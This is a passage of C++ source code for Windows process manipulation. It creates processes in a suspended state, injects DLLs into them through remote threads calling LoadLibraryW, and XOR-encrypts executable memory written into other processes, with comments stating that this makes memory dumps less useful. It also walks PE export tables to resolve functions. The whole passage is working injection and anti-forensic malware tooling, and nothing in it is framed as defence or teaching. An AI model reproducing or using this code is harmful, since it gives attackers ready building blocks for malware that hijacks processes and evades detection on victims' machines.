        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    
    SIZE_T dllPathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    
    LPVOID remotePath = VirtualAllocEx(pi.hProcess, NULL, dllPathLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remotePath) {
        FreeLibrary(hDll);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    
    WriteProcessMemory(pi.hProcess, remotePath, dllPath, dllPathLen, NULL);
    
    PVOID loadLibraryW = (PVOID)GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"
    );
    
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadLibraryW,
                                         remotePath, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    // Cleanup
    VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
    FreeLibrary(hDll);
    
    // Resume process
    ResumeThread(pi.hThread);
    
    DWORD pid = pi.dwProcessId;
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return pid;
}

DWORD createAndInjectEx(LPCWSTR processPath, LPCWSTR dllPath,
                        BOOL(*callback)(HANDLE hProcess, HANDLE hThread)) {
    // Create process in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(processPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        return 0;
    }
    
    // Call callback for custom injection
    if (callback) {
        callback(pi.hProcess, pi.hThread);
    }
    
    // Resume process
    ResumeThread(pi.hThread);
    
    DWORD pid = pi.dwProcessId;
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return pid;
}

} // namespace ThreadHijack

// =============================================================================
// MemObf Namespace Implementation
// =============================================================================

namespace MemObf {

void encryptMemory(PVOID address, SIZE_T size, DWORD key) {
    BYTE* data = (BYTE*)address;
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= (key >> (i % 4)) & 0xFF;
    }
}

void decryptMemory(PVOID address, SIZE_T size, DWORD key) {
    // XOR is self-inverse
    encryptMemory(address, size, key);
}

PVOID allocEncrypted(HANDLE hProcess, SIZE_T size, DWORD key) {
    PVOID address = VirtualAllocEx(hProcess, NULL, size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!address) return NULL;
    
    // Generate random content
    std::vector<BYTE> randomData(size);
    for (SIZE_T i = 0; i < size; i++) {
        randomData[i] = (BYTE)(GenerateRandomDword() & 0xFF);
    }
    
    // Encrypt with key
    encryptMemory(randomData.data(), size, key);
    
    // Write to process
    WriteProcessMemory(hProcess, address, randomData.data(), size, NULL);
    
    return address;
}

BOOL writeEncrypted(HANDLE hProcess, PVOID address,
                    const void* data, SIZE_T size, DWORD key) {
    // Copy data
    std::vector<BYTE> encrypted(size);
    memcpy(encrypted.data(), data, size);
    
    // Encrypt
    encryptMemory(encrypted.data(), size, key);
    
    // Write
    SIZE_T written = 0;
    return WriteProcessMemory(hProcess, address, encrypted.data(), size, &written)
           && written == size;
}

PVOID allocSelfDecrypting(HANDLE hProcess, SIZE_T size, PVOID executableCode) {
    PVOID address = VirtualAllocEx(hProcess, NULL, size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!address) return NULL;
    
    // Write code
    WriteProcessMemory(hProcess, address, executableCode, size, NULL);
    
    // Encrypt after writing (makes memory dump less useful)
    DWORD key = GenerateRandomDword();
    std::vector<BYTE> temp(size);
    ReadProcessMemory(hProcess, address, temp.data(), size, NULL);
    encryptMemory(temp.data(), size, key);
    WriteProcessMemory(hProcess, address, temp.data(), size, NULL);
    
    return address;
}

BOOL hideMemory(HANDLE hProcess, PVOID address, SIZE_T size) {
    DWORD oldProtect = 0;
    // Remove read/write - execute only
    return VirtualProtectEx(hProcess, address, size, PAGE_EXECUTE, &oldProtect);
}

BOOL isValidMemoryRegion(PVOID address, SIZE_T size) {
    MEMORY_BASIC_INFORMATION mbi;
    return VirtualQuery(address, &mbi, sizeof(mbi)) != 0
           && mbi.State == MEM_COMMIT
           && mbi.RegionSize >= size;
}

} // namespace MemObf

// =============================================================================
// ExportTableParser Implementation
// =============================================================================

ExportTableParser::ExportTableParser(PVOID base) : moduleBase(base) {
    if (!base) {
        exportDir = NULL;
        return;
    }
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)base + dosHeader->e_lfanew);
    
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)base + exportRVA);
    
    functionNames = (DWORD*)((BYTE*)base + exportDir->AddressOfNames);
    functionAddresses = (DWORD*)((BYTE*)base + exportDir->AddressOfFunctions);
    functionOrdinals = (WORD*)((BYTE*)base + exportDir->AddressOfNameOrdinals);
    numFunctions = exportDir->NumberOfNames;
}

ExportTableParser::~ExportTableParser() {
    // Nothing to cleanup
}

PVOID ExportTableParser::findByName(LPCSTR functionName) {
    if (!exportDir) return NULL;
    
    for (DWORD i = 0; i < numFunctions; i++) {
        LPCSTR currentName = (LPCSTR)((BYTE*)moduleBase + functionNames[i]);
        if (strcmp(currentName, functionName) == 0) {
            WORD ordinal = functionOrdinals[i];
            return (PVOID)((BYTE*)moduleBase + functionAddresses[ordinal]);
        }
    }
    
    return NULL;
}

PVOID ExportTableParser::findByOrdinal(DWORD ordinal) {
    if (!exportDir) return NULL;
    
    if (ordinal >= exportDir->NumberOfFunctions) return NULL;
    
    return (PVOID)((BYTE*)moduleBase + functionAddresses[ordinal]);
}

std::vector<ExportEntry> ExportTableParser::getAllExports() {
    std::vector<ExportEntry> exports;
    
    if (!exportDir) return exports;
    
    for (DWORD i = 0; i < numFunctions; i++) {
        ExportEntry entry;
        entry.ordinal = functionOrdinals[i];
        entry.address = (PVOID)((BYTE*)moduleBase + functionAddresses[entry.ordinal]);
        entry.name = (LPCSTR)((BYTE*)moduleBase + functionNames[i]);
        exports.push_back(entry);
    }
    
    return exports;
}
